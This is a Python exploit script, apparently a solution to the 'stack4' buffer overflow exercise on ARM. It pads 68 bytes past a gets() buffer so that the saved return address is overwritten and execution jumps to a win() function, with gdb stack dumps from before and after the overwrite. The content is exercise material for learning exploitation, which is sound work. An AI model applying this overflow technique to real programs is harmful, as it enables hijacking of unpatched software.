#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex
import struct

'''
	+----------+
	| A A A A  |  <=== FP-68 [ACID] : gets(FP-68) 
	+----------+-\
	   ...       |
	    ...      | 68 bytes in between
	     ...     |
	+----------+ |
	| saved FP | |
	+----------+-/
	| saved LR |  <--- FP 
	+----------+

(gdb) p win
$2 = {<text variable, no debug info>} 0x1044c <win>
(gdb) b *main+28
(gdb) b *main+32
(gdb) r <<< $(python3 -c "import struct; print('A'*68 + struct.pack('<i', 0x0001044c).decode('utf-8') )")

STACK state before ACID rain
(gdb) x/18xw $fp-68
0xbefff1e8:     0x00000003      0xb6e77be8      0x00000000      0xb6e779f8
0xbefff1f8:     0xbefff230      0xb6fd618c      0x00000000      0x00000000
0xbefff208:     0x00010414      0x000104e0      0xb6fb2ba0      0x00010490
0xbefff218:     0x00000000      0x00010324      0x00000000      0x00000000
0xbefff228:     0x00000000      0xb6e8c294

414141414141414141414141414141414141414141414141414141414141
414141414141414141414141414141414141414141414141414141414141
41414141414141414c040100

STACK state after ACID rain
(gdb) x/18xw $fp-68
0xbefff1e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff208:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff218:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff228:     0x41414141      0x0001044c

'''

target = "./stack4"
payload = "A"*68
payload += struct.pack('<I', 0x0001044c).decode('utf-8') 

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload.encode('utf-8'))
fo.close()

p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload.encode('utf-8'))		# encode payload from string to bytes
p.stdin.flush()					# send payload to target process
